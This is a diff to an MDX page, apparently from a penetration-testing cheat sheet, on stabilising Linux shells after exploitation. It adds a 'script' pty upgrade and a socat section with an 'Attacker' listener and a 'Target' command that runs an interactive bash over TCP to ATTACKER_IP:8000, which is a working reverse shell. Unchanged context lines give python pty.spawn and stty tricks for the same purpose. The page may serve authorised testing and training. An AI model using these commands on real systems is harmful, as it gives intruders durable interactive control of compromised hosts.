@@ -5,6 +5,9 @@ description: Linux Shell Stabilization
 keywords: [shell stabilization, shell stabilization linux, netcat shell stabilization, netcat stabilization]
 ---
 
+import Tabs from '@theme/Tabs';
+import TabItem from '@theme/TabItem';
+
 
 
 ```batch
@@ -20,6 +23,9 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 :: Python[2]
 python -c 'import pty; pty.spawn("/bin/bash")'
+
+:: Script
+script -qc /bin/bash /dev/null
 ```
 
 ```batch
@@ -56,3 +62,25 @@ tput cols; tput lines;
 export SHELL=bash; export TERM=xterm; stty rows 42 columns 220
 ```
 
+## Socat
+
+<Tabs>
+  <TabItem value="socat_one" label="Attacker"> 
+    <p>
+
+```batch
+socat file:`tty`,raw,echo=0 tcp-listen:8000
+```
+
+</p>
+  </TabItem>
+  <TabItem value="socat_two" label="Target">
+    <p>
+
+```batch
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:8000
+```
+
+</p>
+  </TabItem>
+</Tabs>
